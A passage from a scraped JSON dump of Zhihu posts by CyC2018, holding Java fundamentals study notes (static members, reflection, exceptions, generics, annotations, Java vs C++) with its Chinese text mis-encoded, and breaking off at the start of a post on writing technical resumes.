<span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kd\">static</span> <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">func1</span><span class=\"o\">(){</span>\n        <span class=\"kt\">int</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n        <span class=\"c1\">// int b = y;  // Non-static field &#39;y&#39; cannot be referenced from a static context\n</span><span class=\"c1\"></span>        <span class=\"c1\">// int b = this.y;     // &#39;A.this&#39; cannot be referenced from a static context\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p><b>3. é™æ€è¯­å¥å—</b> </p><p>é™æ€è¯­å¥å—åœ¨ç±»åˆå§‹åŒ–æ—¶è¿è¡Œä¸€æ¬¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"o\">{</span>\n    <span class=\"kd\">static</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;123&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">A</span> <span class=\"n\">a1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">A</span><span class=\"o\">();</span>\n        <span class=\"n\">A</span> <span class=\"n\">a2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">A</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">123</span></code></pre></div><p><b>4. é™æ€å†…éƒ¨ç±»</b> </p><p>éé™æ€å†…éƒ¨ç±»ä¾èµ–äºå¤–éƒ¨ç±»çš„å®ä¾‹ï¼Œè€Œé™æ€å†…éƒ¨ç±»ä¸éœ€è¦ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">OuterClass</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">class</span> <span class=\"nc\">InnerClass</span> <span class=\"o\">{</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">static</span> <span class=\"kd\">class</span> <span class=\"nc\">StaticInnerClass</span> <span class=\"o\">{</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"c1\">// InnerClass innerClass = new InnerClass(); // &#39;OuterClass.this&#39; cannot be referenced from a static context\n</span><span class=\"c1\"></span>        <span class=\"n\">OuterClass</span> <span class=\"n\">outerClass</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">OuterClass</span><span class=\"o\">();</span>\n        <span class=\"n\">InnerClass</span> <span class=\"n\">innerClass</span> <span class=\"o\">=</span> <span class=\"n\">outerClass</span><span class=\"o\">.</span><span class=\"na\">new</span> <span class=\"nf\">InnerClass</span><span class=\"o\">();</span>\n        <span class=\"n\">StaticInnerClass</span> <span class=\"n\">staticInnerClass</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">StaticInnerClass</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>é™æ€å†…éƒ¨ç±»ä¸èƒ½è®¿é—®å¤–éƒ¨ç±»çš„éé™æ€çš„å˜é‡å’Œæ–¹æ³•ã€‚</p><p><b>5. é™æ€å¯¼åŒ…</b> </p><p>åœ¨ä½¿ç”¨é™æ€å˜é‡å’Œæ–¹æ³•æ—¶ä¸ç”¨å†æŒ‡æ˜ ClassNameï¼Œä»è€Œç®€åŒ–ä»£ç ï¼Œä½†å¯è¯»æ€§å¤§å¤§é™ä½ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kn\">import static</span> <span class=\"nn\">com.xxx.ClassName.*</span></code></pre></div><p><b>6. åˆå§‹åŒ–é¡ºåº</b> </p><p>é™æ€å˜é‡å’Œé™æ€è¯­å¥å—ä¼˜å…ˆäºå®ä¾‹å˜é‡å’Œæ™®é€šè¯­å¥å—ï¼Œé™æ€å˜é‡å’Œé™æ€è¯­å¥å—çš„åˆå§‹åŒ–é¡ºåºå–å†³äºå®ƒä»¬åœ¨ä»£ç ä¸­çš„é¡ºåºã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"n\">String</span> <span class=\"n\">staticField</span> <span class=\"o\">=</span> <span class=\"s\">&#34;é™æ€å˜é‡&#34;</span><span class=\"o\">;</span>\n<span class=\"kd\">static</span> <span class=\"o\">{</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;é™æ€è¯­å¥å—&#34;</span><span class=\"o\">);</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"n\">field</span> <span class=\"o\">=</span> <span class=\"s\">&#34;å®ä¾‹å˜é‡&#34;</span><span class=\"o\">;</span>\n<span class=\"o\">{</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;æ™®é€šè¯­å¥å—&#34;</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><p>æœ€åæ‰æ˜¯æ„é€ å‡½æ•°çš„åˆå§‹åŒ–ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"nf\">InitialOrderTest</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;æ„é€ å‡½æ•°&#34;</span><span class=\"o\">);</span>\n<span class=\"o\">}</span></code></pre></div><p>å­˜åœ¨ç»§æ‰¿çš„æƒ…å†µä¸‹ï¼Œåˆå§‹åŒ–é¡ºåºä¸ºï¼š</p><ul><li>çˆ¶ç±»ï¼ˆé™æ€å˜é‡ã€é™æ€è¯­å¥å—ï¼‰</li><li>å­ç±»ï¼ˆé™æ€å˜é‡ã€é™æ€è¯­å¥å—ï¼‰</li><li>çˆ¶ç±»ï¼ˆå®ä¾‹å˜é‡ã€æ™®é€šè¯­å¥å—ï¼‰</li><li>çˆ¶ç±»ï¼ˆæ„é€ å‡½æ•°ï¼‰</li><li>å­ç±»ï¼ˆå®ä¾‹å˜é‡ã€æ™®é€šè¯­å¥å—ï¼‰</li><li>å­ç±»ï¼ˆæ„é€ å‡½æ•°ï¼‰</li></ul><h2>ä¸ƒã€åå°„</h2><p>æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ª  <b>Class</b>  å¯¹è±¡ï¼ŒåŒ…å«äº†ä¸ç±»æœ‰å…³çš„ä¿¡æ¯ã€‚å½“ç¼–è¯‘ä¸€ä¸ªæ–°ç±»æ—¶ï¼Œä¼šäº§ç”Ÿä¸€ä¸ªåŒåçš„ .class æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å†…å®¹ä¿å­˜ç€ Class å¯¹è±¡ã€‚</p><p>ç±»åŠ è½½ç›¸å½“äº Class å¯¹è±¡çš„åŠ è½½ï¼Œç±»åœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨æ—¶æ‰åŠ¨æ€åŠ è½½åˆ° JVM ä¸­ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>Class.forName(&#34;com.mysql.jdbc.Driver&#34;)</code> è¿™ç§æ–¹å¼æ¥æ§åˆ¶ç±»çš„åŠ è½½ï¼Œè¯¥æ–¹æ³•ä¼šè¿”å›ä¸€ä¸ª Class å¯¹è±¡ã€‚</p><p>åå°„å¯ä»¥æä¾›è¿è¡Œæ—¶çš„ç±»ä¿¡æ¯ï¼Œå¹¶ä¸”è¿™ä¸ªç±»å¯ä»¥åœ¨è¿è¡Œæ—¶æ‰åŠ è½½è¿›æ¥ï¼Œç”šè‡³åœ¨ç¼–è¯‘æ—¶æœŸè¯¥ç±»çš„ .class ä¸å­˜åœ¨ä¹Ÿå¯ä»¥åŠ è½½è¿›æ¥ã€‚</p><p>Class å’Œ java.lang.reflect ä¸€èµ·å¯¹åå°„æä¾›äº†æ”¯æŒï¼Œjava.lang.reflect ç±»åº“ä¸»è¦åŒ…å«äº†ä»¥ä¸‹ä¸‰ä¸ªç±»ï¼š</p><ul><li><b>Field</b> ï¼šå¯ä»¥ä½¿ç”¨ get() å’Œ set() æ–¹æ³•è¯»å–å’Œä¿®æ”¹ Field å¯¹è±¡å…³è”çš„å­—æ®µï¼›</li><li><b>Method</b> ï¼šå¯ä»¥ä½¿ç”¨ invoke() æ–¹æ³•è°ƒç”¨ä¸ Method å¯¹è±¡å…³è”çš„æ–¹æ³•ï¼›</li><li><b>Constructor</b> ï¼šå¯ä»¥ç”¨ Constructor åˆ›å»ºæ–°çš„å¯¹è±¡ã€‚</li></ul><p><b>åå°„çš„ä¼˜ç‚¹ï¼š</b> </p><ul><li><b>å¯æ‰©å±•æ€§</b>  ï¼šåº”ç”¨ç¨‹åºå¯ä»¥åˆ©ç”¨å…¨é™å®šååˆ›å»ºå¯æ‰©å±•å¯¹è±¡çš„å®ä¾‹ï¼Œæ¥ä½¿ç”¨æ¥è‡ªå¤–éƒ¨çš„ç”¨æˆ·è‡ªå®šä¹‰ç±»ã€‚</li><li><b>ç±»æµè§ˆå™¨å’Œå¯è§†åŒ–å¼€å‘ç¯å¢ƒ</b>  ï¼šä¸€ä¸ªç±»æµè§ˆå™¨éœ€è¦å¯ä»¥æšä¸¾ç±»çš„æˆå‘˜ã€‚å¯è§†åŒ–å¼€å‘ç¯å¢ƒï¼ˆå¦‚ IDEï¼‰å¯ä»¥ä»åˆ©ç”¨åå°„ä¸­å¯ç”¨çš„ç±»å‹ä¿¡æ¯ä¸­å—ç›Šï¼Œä»¥å¸®åŠ©ç¨‹åºå‘˜ç¼–å†™æ­£ç¡®çš„ä»£ç ã€‚</li><li><b>è°ƒè¯•å™¨å’Œæµ‹è¯•å·¥å…·</b>  ï¼š è°ƒè¯•å™¨éœ€è¦èƒ½å¤Ÿæ£€æŸ¥ä¸€ä¸ªç±»é‡Œçš„ç§æœ‰æˆå‘˜ã€‚æµ‹è¯•å·¥å…·å¯ä»¥åˆ©ç”¨åå°„æ¥è‡ªåŠ¨åœ°è°ƒç”¨ç±»é‡Œå®šä¹‰çš„å¯è¢«å‘ç°çš„ API å®šä¹‰ï¼Œä»¥ç¡®ä¿ä¸€ç»„æµ‹è¯•ä¸­æœ‰è¾ƒé«˜çš„ä»£ç è¦†ç›–ç‡ã€‚</li></ul><p><b>åå°„çš„ç¼ºç‚¹ï¼š</b> </p><p>å°½ç®¡åå°„éå¸¸å¼ºå¤§ï¼Œä½†ä¹Ÿä¸èƒ½æ»¥ç”¨ã€‚å¦‚æœä¸€ä¸ªåŠŸèƒ½å¯ä»¥ä¸ç”¨åå°„å®Œæˆï¼Œé‚£ä¹ˆæœ€å¥½å°±ä¸ç”¨ã€‚åœ¨æˆ‘ä»¬ä½¿ç”¨åå°„æŠ€æœ¯æ—¶ï¼Œä¸‹é¢å‡ æ¡å†…å®¹åº”è¯¥ç‰¢è®°äºå¿ƒã€‚</p><ul><li><b>æ€§èƒ½å¼€é”€</b>  ï¼šåå°„æ¶‰åŠäº†åŠ¨æ€ç±»å‹çš„è§£æï¼Œæ‰€ä»¥ JVM æ— æ³•å¯¹è¿™äº›ä»£ç è¿›è¡Œä¼˜åŒ–ã€‚å› æ­¤ï¼Œåå°„æ“ä½œçš„æ•ˆç‡è¦æ¯”é‚£äº›éåå°„æ“ä½œä½å¾—å¤šã€‚æˆ‘ä»¬åº”è¯¥é¿å…åœ¨ç»å¸¸è¢«æ‰§è¡Œçš„ä»£ç æˆ–å¯¹æ€§èƒ½è¦æ±‚å¾ˆé«˜çš„ç¨‹åºä¸­ä½¿ç”¨åå°„ã€‚<br/> </li><li><b>å®‰å…¨é™åˆ¶</b>  ï¼šä½¿ç”¨åå°„æŠ€æœ¯è¦æ±‚ç¨‹åºå¿…é¡»åœ¨ä¸€ä¸ªæ²¡æœ‰å®‰å…¨é™åˆ¶çš„ç¯å¢ƒä¸­è¿è¡Œã€‚å¦‚æœä¸€ä¸ªç¨‹åºå¿…é¡»åœ¨æœ‰å®‰å…¨é™åˆ¶çš„ç¯å¢ƒä¸­è¿è¡Œï¼Œå¦‚ Appletï¼Œé‚£ä¹ˆè¿™å°±æ˜¯ä¸ªé—®é¢˜äº†ã€‚<br/> </li><li><b>å†…éƒ¨æš´éœ²</b>  ï¼šç”±äºåå°„å…è®¸ä»£ç æ‰§è¡Œä¸€äº›åœ¨æ­£å¸¸æƒ…å†µä¸‹ä¸è¢«å…è®¸çš„æ“ä½œï¼ˆæ¯”å¦‚è®¿é—®ç§æœ‰çš„å±æ€§å’Œæ–¹æ³•ï¼‰ï¼Œæ‰€ä»¥ä½¿ç”¨åå°„å¯èƒ½ä¼šå¯¼è‡´æ„æ–™ä¹‹å¤–çš„å‰¯ä½œç”¨ï¼Œè¿™å¯èƒ½å¯¼è‡´ä»£ç åŠŸèƒ½å¤±è°ƒå¹¶ç ´åå¯ç§»æ¤æ€§ã€‚åå°„ä»£ç ç ´åäº†æŠ½è±¡æ€§ï¼Œå› æ­¤å½“å¹³å°å‘ç”Ÿæ”¹å˜çš„æ—¶å€™ï¼Œä»£ç çš„è¡Œä¸ºå°±æœ‰å¯èƒ½ä¹Ÿéšç€å˜åŒ–ã€‚<br/> </li><li><a href=\"https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/tutorial/reflect/index.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Trail: The Reflection API</a><br/> </li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.sczyh30.com/posts/Java/java-reflection-1/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ·±å…¥è§£æ Java åå°„ï¼ˆ1ï¼‰- åŸºç¡€</a></li></ul><h2>å…«ã€å¼‚å¸¸</h2><p>Throwable å¯ä»¥ç”¨æ¥è¡¨ç¤ºä»»ä½•å¯ä»¥ä½œä¸ºå¼‚å¸¸æŠ›å‡ºçš„ç±»ï¼Œåˆ†ä¸ºä¸¤ç§ï¼š <b>Error</b>  å’Œ <b>Exception</b>ã€‚å…¶ä¸­ Error ç”¨æ¥è¡¨ç¤º JVM æ— æ³•å¤„ç†çš„é”™è¯¯ï¼ŒException åˆ†ä¸ºä¸¤ç§ï¼š</p><ul><li><b>å—æ£€å¼‚å¸¸</b> ï¼šéœ€è¦ç”¨ try...catch... è¯­å¥æ•è·å¹¶è¿›è¡Œå¤„ç†ï¼Œå¹¶ä¸”å¯ä»¥ä»å¼‚å¸¸ä¸­æ¢å¤ï¼›</li><li><b>éå—æ£€å¼‚å¸¸</b> ï¼šæ˜¯ç¨‹åºè¿è¡Œæ—¶é”™è¯¯ï¼Œä¾‹å¦‚é™¤ 0 ä¼šå¼•å‘ Arithmetic Exceptionï¼Œæ­¤æ—¶ç¨‹åºå´©æºƒå¹¶ä¸”æ— æ³•æ¢å¤ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-963f9f87446d7c56f1ea1ab9241e2293_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4096\" data-rawheight=\"2272\" class=\"origin_image zh-lightbox-thumb\" width=\"4096\" data-original=\"https://pic4.zhimg.com/v2-963f9f87446d7c56f1ea1ab9241e2293_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;4096&#39; height=&#39;2272&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4096\" data-rawheight=\"2272\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"4096\" data-original=\"https://pic4.zhimg.com/v2-963f9f87446d7c56f1ea1ab9241e2293_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-963f9f87446d7c56f1ea1ab9241e2293_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li><a href=\"https://link.zhihu.com/?target=https%3A//www.tianmaying.com/tutorial/Java-Exception\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java å…¥é—¨ä¹‹å¼‚å¸¸å¤„ç†</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.importnew.com/7383.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java å¼‚å¸¸çš„é¢è¯•é—®é¢˜åŠç­”æ¡ˆ -Part 1</a></li></ul><h2>ä¹ã€æ³›å‹</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Box</span><span class=\"o\">&lt;</span><span class=\"n\">T</span><span class=\"o\">&gt;</span> <span class=\"o\">{</span>\n    <span class=\"c1\">// T stands for &#34;Type&#34;\n</span><span class=\"c1\"></span>    <span class=\"kd\">private</span> <span class=\"n\">T</span> <span class=\"n\">t</span><span class=\"o\">;</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">set</span><span class=\"o\">(</span><span class=\"n\">T</span> <span class=\"n\">t</span><span class=\"o\">)</span> <span class=\"o\">{</span> <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">t</span> <span class=\"o\">=</span> <span class=\"n\">t</span><span class=\"o\">;</span> <span class=\"o\">}</span>\n    <span class=\"kd\">public</span> <span class=\"n\">T</span> <span class=\"nf\">get</span><span class=\"o\">()</span> <span class=\"o\">{</span> <span class=\"k\">return</span> <span class=\"n\">t</span><span class=\"o\">;</span> <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><ul><li><a href=\"https://link.zhihu.com/?target=http%3A//www.importnew.com/24029.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java æ³›å‹è¯¦è§£</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//cloud.tencent.com/developer/article/1033693\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">10 é“ Java æ³›å‹é¢è¯•é¢˜</a></li></ul><h2>åã€æ³¨è§£</h2><p>Java æ³¨è§£æ˜¯é™„åŠ åœ¨ä»£ç ä¸­çš„ä¸€äº›å…ƒä¿¡æ¯ï¼Œç”¨äºä¸€äº›å·¥å…·åœ¨ç¼–è¯‘ã€è¿è¡Œæ—¶è¿›è¡Œè§£æå’Œä½¿ç”¨ï¼Œèµ·åˆ°è¯´æ˜ã€é…ç½®çš„åŠŸèƒ½ã€‚æ³¨è§£ä¸ä¼šä¹Ÿä¸èƒ½å½±å“ä»£ç çš„å®é™…é€»è¾‘ï¼Œä»…ä»…èµ·åˆ°è¾…åŠ©æ€§çš„ä½œç”¨ã€‚</p><p><a href=\"https://link.zhihu.com/?target=https%3A//www.cnblogs.com/acm-bingzi/p/javaAnnotation.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">æ³¨è§£ Annotation å®ç°åŸç†ä¸è‡ªå®šä¹‰æ³¨è§£ä¾‹å­</a></p><h2>åä¸€ã€ç‰¹æ€§</h2><h2>Java å„ç‰ˆæœ¬çš„æ–°ç‰¹æ€§</h2><p><b>New highlights in Java SE 8</b> </p><ol><li>Lambda Expressions</li><li>Pipelines and Streams</li><li>Date and Time API</li><li>Default Methods</li><li>Type Annotations</li><li>Nashhorn JavaScript Engine</li><li>Concurrent Accumulators</li><li>Parallel operations</li><li>PermGen Error Removed</li></ol><p><b>New highlights in Java SE 7</b> </p><ol><li>Strings in Switch Statement</li><li>Type Inference for Generic Instance Creation</li><li>Multiple Exception Handling</li><li>Support for Dynamic Languages</li><li>Try with Resources</li><li>Java nio Package</li><li>Binary Literals, Underscore in literals</li><li> Diamond Syntax<br/> </li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.selfgrowth.com/articles/difference-between-java-18-and-java-17\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Difference between Java 1.8 and Java 1.7?</a><br/> </li><li><a href=\"https://link.zhihu.com/?target=http%3A//www.importnew.com/19345.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Java 8 ç‰¹æ€§</a></li></ol><h2>Java ä¸ C++ çš„åŒºåˆ«</h2><ul><li>Java æ˜¯çº¯ç²¹çš„é¢å‘å¯¹è±¡è¯­è¨€ï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½ç»§æ‰¿è‡ª java.lang.Objectï¼ŒC++ ä¸ºäº†å…¼å®¹ C å³æ”¯æŒé¢å‘å¯¹è±¡ä¹Ÿæ”¯æŒé¢å‘è¿‡ç¨‹ã€‚</li><li>Java é€šè¿‡è™šæ‹Ÿæœºä»è€Œå®ç°è·¨å¹³å°ç‰¹æ€§ï¼Œä½†æ˜¯ C++ ä¾èµ–äºç‰¹å®šçš„å¹³å°ã€‚</li><li>Java æ²¡æœ‰æŒ‡é’ˆï¼Œå®ƒçš„å¼•ç”¨å¯ä»¥ç†è§£ä¸ºå®‰å…¨æŒ‡é’ˆï¼Œè€Œ C++ å…·æœ‰å’Œ C ä¸€æ ·çš„æŒ‡é’ˆã€‚</li><li>Java æ”¯æŒè‡ªåŠ¨åƒåœ¾å›æ”¶ï¼Œè€Œ C++ éœ€è¦æ‰‹åŠ¨å›æ”¶ã€‚</li><li>Java ä¸æ”¯æŒå¤šé‡ç»§æ‰¿ï¼Œåªèƒ½é€šè¿‡å®ç°å¤šä¸ªæ¥å£æ¥è¾¾åˆ°ç›¸åŒç›®çš„ï¼Œè€Œ C++ æ”¯æŒå¤šé‡ç»§æ‰¿ã€‚</li><li>Java ä¸æ”¯æŒæ“ä½œç¬¦é‡è½½ï¼Œè™½ç„¶å¯ä»¥å¯¹ä¸¤ä¸ª String å¯¹è±¡æ‰§è¡ŒåŠ æ³•è¿ç®—ï¼Œä½†æ˜¯è¿™æ˜¯è¯­è¨€å†…ç½®æ”¯æŒçš„æ“ä½œï¼Œä¸å±äºæ“ä½œç¬¦é‡è½½ï¼Œè€Œ C++ å¯ä»¥ã€‚</li><li>Java çš„ goto æ˜¯ä¿ç•™å­—ï¼Œä½†æ˜¯ä¸å¯ç”¨ï¼ŒC++ å¯ä»¥ä½¿ç”¨ gotoã€‚</li><li>Java ä¸æ”¯æŒæ¡ä»¶ç¼–è¯‘ï¼ŒC++ é€šè¿‡ #ifdef #ifndef ç­‰é¢„å¤„ç†å‘½ä»¤ä»è€Œå®ç°æ¡ä»¶ç¼–è¯‘ã€‚</li></ul><p><a href=\"https://link.zhihu.com/?target=http%3A//cs-fundamentals.com/tech-interview/java/differences-between-java-and-cpp.php\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">What are the main differences between Java and C++?</a></p><h2>JRE or JDK</h2><ul><li>JRE is the JVM program, Java application need to run on JRE.</li><li>JDK is a superset of JRE, JRE + tools for developing java programs. e.g, it provides the compiler &#34;javac&#34;</li></ul><h2>å‚è€ƒèµ„æ–™</h2><ul><li>Eckel B. Java ç¼–ç¨‹æ€æƒ³[M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2002.</li><li>Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.</li></ul><p class=\"ztext-empty-paragraph\"><br/></p><p>â­ï¸æ¬¢è¿å…³æ³¨æˆ‘çš„å…¬ä¼—å· CyC2018ï¼Œåœ¨å…¬ä¼—å·åå°å›å¤å…³é”®å­— ğŸ“š <b>èµ„æ–™</b> å¯é¢†å–å¤ä¹ å¤§çº²ï¼Œè¿™ä»½å¤§çº²æ˜¯æˆ‘èŠ±äº†ä¸€æ•´å¹´æ—¶é—´æ•´ç†çš„é¢è¯•çŸ¥è¯†ç‚¹åˆ—è¡¨ï¼Œä¸ä»…ç³»ç»Ÿæ•´ç†äº†é¢è¯•çŸ¥è¯†ç‚¹ï¼Œè€Œä¸”æ ‡æ³¨äº†å„ä¸ªçŸ¥è¯†ç‚¹çš„é‡è¦ç¨‹åº¦ï¼Œä»è€Œå¸®ä½ ç†æ¸…å¤šè€Œæ‚çš„é¢è¯•çŸ¥è¯†ç‚¹ã€‚å¯ä»¥è¯´æˆ‘åŸºæœ¬æ˜¯æŒ‰ç…§è¿™ä»½å¤§çº²æ¥è¿›è¡Œå¤ä¹ çš„ï¼Œè¿™ä»½å¤§çº²å¯¹æˆ‘æ‹¿åˆ°äº† BAT å¤´æ¡ç­‰ Offer èµ·åˆ°å¾ˆå¤§çš„å¸®åŠ©ã€‚ä½ ä»¬å®Œå…¨å¯ä»¥å’Œæˆ‘ä¸€æ ·æ ¹æ®å¤§çº²ä¸Šåˆ—çš„çŸ¥è¯†ç‚¹æ¥è¿›è¡Œå¤ä¹ ï¼Œå°±ä¸ç”¨çœ‹å¾ˆå¤šä¸é‡è¦çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥çŸ¥é“å“ªäº›å†…å®¹å¾ˆé‡è¦ä»è€Œå¤šå®‰æ’ä¸€äº›å¤ä¹ æ—¶é—´ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-eaaf41eacfa3bb7288d7b468d46b1fec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"258\" data-rawheight=\"258\" class=\"content_image\" width=\"258\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;258&#39; height=&#39;258&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"258\" data-rawheight=\"258\" class=\"content_image lazy\" width=\"258\" data-actualsrc=\"https://pic1.zhimg.com/v2-eaaf41eacfa3bb7288d7b468d46b1fec_b.jpg\"/></figure><p></p><p></p>", 
            "topic": [
                {
                    "tag": "Java", 
                    "tagLink": "https://api.zhihu.com/topics/19561132"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/56655602", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 4, 
            "title": "å†™å¥½æŠ€æœ¯ç®€å†", 
            "content": "<p>âœğŸ»</p><h2>1. é‡è¦æ€§</h2><ul><li> å„å¤§å…¬å¸æ¯å¹´éƒ½è¦æ¥æ”¶æˆåƒä¸Šä¸‡ä»½ç®€å†ï¼Œä½†æ˜¯è€ƒè™‘åˆ°æ‹›è˜æˆæœ¬ï¼Œç®€å†è¦å…ˆç»è¿‡ç³»ç»Ÿå’Œ HR ç­›é€‰ï¼Œç®€å†ç­›é€‰å†³å®šäº†ä½ æ˜¯å¦æœ‰ç¬”è¯•å’Œé¢è¯•èµ„æ ¼ã€‚HR éœ€è¦ä»è¿™ä¹ˆå¤šçš„ç®€å†ä¸­ç­›é€‰å‡ºåˆé€‚çš„ç®€å†ï¼Œé‚£ä¹ˆä¸€ä»½ç®€å†é€šå¸¸ä¸ä¼šèŠ±ç‰¹åˆ«å¤šçš„æ—¶é—´è¿›è¡Œç­›é€‰ï¼Œæ‰€ä»¥å°±éœ€è¦è®© HR åœ¨å¾ˆçŸ­çš„ç­›é€‰æ—¶é—´ä¸­è®¤å¯ä½ çš„ç®€å†ã€‚<br/> </li><li> ç®€å†é€šè¿‡ç­›é€‰ä¹‹åå°±è¢«æ”¾å…¥äººæ‰åº“ä¸­ï¼Œç­‰å¾…å‘èµ·ç¬”è¯•å’Œé¢è¯•ã€‚å¦‚æœç®€å†è¶³å¤Ÿä¼˜ç§€ï¼Œå¯ä»¥åœ¨æå‰æ‰¹é˜¶æ®µå…ç¬”è¯•ç›´æ¥è·å¾—é¢è¯•æœºä¼šï¼Œæˆ–è€…ç¬”è¯•æˆç»©ä¸ç†æƒ³ä½†ä¹Ÿæœ‰é¢è¯•æœºä¼šï¼Œè¿™ä¸»è¦çœ‹æœ‰æ²¡æœ‰é¢è¯•å®˜ä»äººæ‰åº“ä¸­æŠŠä½ çš„ç®€å†æèµ·æ¥ã€‚<br/> </li><li>é¢è¯•è¿‡ç¨‹é€šå¸¸ä¼šæŒ‰ç…§ç®€å†ä¸Šçš„å†…å®¹è¿›è¡Œæé—®ï¼Œæ‰€ä»¥ç®€å†ä¹Ÿå¯ä»¥å½“æˆæ˜¯é¢è¯•å¤§çº²ã€‚å¦‚æœä½ 